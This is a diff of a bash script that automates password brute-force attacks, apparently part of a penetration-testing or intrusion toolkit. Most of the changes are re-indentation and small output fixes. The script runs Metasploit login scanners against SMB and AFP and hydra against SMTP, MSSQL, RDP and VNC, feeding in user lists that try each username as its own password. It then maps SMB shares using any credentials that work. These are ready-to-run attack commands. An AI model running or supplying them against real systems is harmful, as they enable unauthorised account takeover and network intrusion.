@@ -256,6 +256,7 @@ fi
 
 #SMTP
 if [[ ! -z "$smtp_svc" ]];then
+	echo "===> SMTP Open : Looking for mails"
 	if [[ ! -z "$mails" ]];then
 		echo "===> SMTP Open and mails dumped : Bruteforce with hydra smtp "
 		bash create_mail_password_list.sh > mailpass
@@ -284,78 +285,79 @@ fi
 #SMB
 #bruteforce
 if [[ ! -z "$smb_svc" ]];then
-echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
-msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;" | grep "Success:" | cut -d "'" -f 2 > valid_user_pass_smb & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
+	echo "===> SMB Open : BF With MSF MODULE SMB_Login (CTRL+C to skip)"
+	msfconsole -q -x "use auxiliary/scanner/smb/smb_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1; set SMBDOMAIN $url; set THREADS 10; exploit; exit;" | grep "Success:" | cut -d "'" -f 2 > valid_user_pass_smb & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '/' '|' '\'; do echo -en "\b$X"; sleep 0.1; done; done
 
-valid_user_pass_smb=$(cat valid_user_pass_smb)
+	valid_user_pass_smb=$(cat valid_user_pass_smb)
 
 
 #map if user found
-if [[ ! -z "$valid_user_pass_smb" ]];then
+	if [[ ! -z "$valid_user_pass_smb" ]];then
 
-echo "===> SMB Open : Valid User/Password Found Let's map"
-echo "$valid_user_pass_smb"
-for validuserpass in $(cat valid_user_pass_smb)
-do
-validsmbuser=$(echo $validuserpass | cut -d "\\" -f 2  | cut -d ":" -f 1)
-echo ""
-echo "User: $validsmbuser, Pass: "$validsmbuser""
-smbmap -H $line -u $validsmbuser -p $validsmbuser
-done
-else
-"===> SMB Open : No Valid User/Password Found"
-echo 
-fi
+		echo "===> SMB Open : Valid User/Password Found Let's map"
+		echo "$valid_user_pass_smb"
+		for validuserpass in $(cat valid_user_pass_smb)
+		do
+			validsmbuser=$(echo $validuserpass | cut -d "\\" -f 2  | cut -d ":" -f 1)
+			echo ""
+			echo "User: $validsmbuser, Pass: "$validsmbuser""
+			smbmap -H $line -u $validsmbuser -p $validsmbuser
+		done
+	else	
+		echo ""
+		echo "===> SMB Open : No Valid User/Password Found"
+		
+	fi
 else 
-echo "===> SMB Closed"
+	echo "===> SMB Closed"
 fi
 
 #AFP
 if [[ ! -z "$afp_svc" ]];then
-echo "===> AFP Open : BF With MSF MODULE AFP_Login"
-msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
+	echo "===> AFP Open : BF With MSF MODULE AFP_Login"
+	msfconsole -q -x "use auxiliary/scanner/afp/afp_login;set RHOSTS $line; set USER_FILE /root/ldapshit/users;set USER_AS_PASS 1;set THREADS 10; exploit; exit;"
 else 
-echo "===> AFP Closed"
+	echo "===> AFP Closed"
 fi
 
 #MSSQL
 if [[ ! -z "$mssql_svc" ]];then
-echo "===> MSSQL Open : BF With Hydra MSSQL"
-bash create_user_password_list.sh > userpass
-hydra -C userpass $line mssql
+	echo "===> MSSQL Open : BF With Hydra MSSQL"
+	bash create_user_password_list.sh > userpass
+	hydra -C userpass $line mssql
 else 
-echo "===> MSSQL Closed"
+	echo "===> MSSQL Closed"
 fi
 
 #RDP
 if [[ ! -z "$rdp_svc" ]];then
-echo "===> RDP Open : BF With Hydra RDP"
-bash create_user_password_list.sh > userpass
-hydra -t 1 -V -f -C userpass rdp://$line
+	echo "===> RDP Open : BF With Hydra RDP"
+	bash create_user_password_list.sh > userpass
+	hydra -t 1 -V -f -C userpass rdp://$line
 else 
-echo "===> RDP Closed"
+	echo "===> RDP Closed"
 fi
 
 #VNC
 if [[ ! -z "$vnc_svc" ]];then
-echo "===> VNC Open : BF With hydra ftp"
-echo "$(echo "$users" | wc -l ) Users"
-if [ "$nbusers" -lt 80 ]; then 
-echo "===> VNC Open : Few Users , Let's go"
-bash create_user_password_list.sh > userpass
-hydra -C userpass -I -V $line vnc
-else
-echo "===> VNC Open : Lot of users, are you sure (yes/no)"
-read -t 5 vncbrute
-if [ "$vncbrute" == "yes" ];then
-bash create_user_password_list.sh > userpass
-hydra -C userpass -I -V $line vnc
-else
-echo "===> VNC Bruteforce Aborted"
-fi
-fi
+	echo "===> VNC Open : BF With hydra ftp"
+	echo "$(echo "$users" | wc -l ) Users"
+	if [ "$nbusers" -lt 80 ]; then 
+		echo "===> VNC Open : Few Users , Let's go"
+		bash create_user_password_list.sh > userpass
+		hydra -C userpass -I -V $line vnc
+	else
+		echo "===> VNC Open : Lot of users, are you sure (yes/no)"
+		read -t 5 vncbrute
+		if [ "$vncbrute" == "yes" ];then
+			bash create_user_password_list.sh > userpass
+			hydra -C userpass -I -V $line vnc
+		else
+			echo "===> VNC Bruteforce Aborted"
+		fi
+	fi
 else 
-echo "===> VNC Closed"
+	echo "===> VNC Closed"
 fi
 
 
